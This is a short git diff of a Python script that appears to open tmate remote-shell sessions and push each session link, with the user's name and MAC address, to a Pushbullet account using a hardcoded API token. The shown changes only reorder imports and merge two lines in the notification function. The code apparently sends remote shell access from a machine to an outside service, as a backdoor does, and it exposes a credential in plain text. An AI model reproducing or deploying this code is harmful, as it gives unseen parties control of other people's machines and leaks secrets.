@@ -1,10 +1,10 @@
 #!/bin/python3
+from pushbullet import Pushbullet
+import subprocess
+import requests
+import time
 import os
 import re
-import time
-import requests
-import subprocess
-from pushbullet import Pushbullet
 
 # Function to check internet connectivity
 def is_connected():
@@ -66,8 +66,7 @@ def generate_new_session(session_file):
 # Function to send data to API and push notification
 def send_notification(username, mac_address, ssh_session):
     try:
-        web_data = ssh_session.split('@')[0]
-        web_session = web_data.replace('ssh ', 'https://tmate.io/t/')
+        web_session = ssh_session.split('@')[0].replace('ssh ', 'https://tmate.io/t/')
         title = f'User: {username} - MAC: {mac_address}'
         message = f'{ssh_session}\n\n{web_session}'
         Pushbullet("o.poi7TyVkRHwDRA9rtGJ0aON9iJcbx8Pp").push_note(title, message)
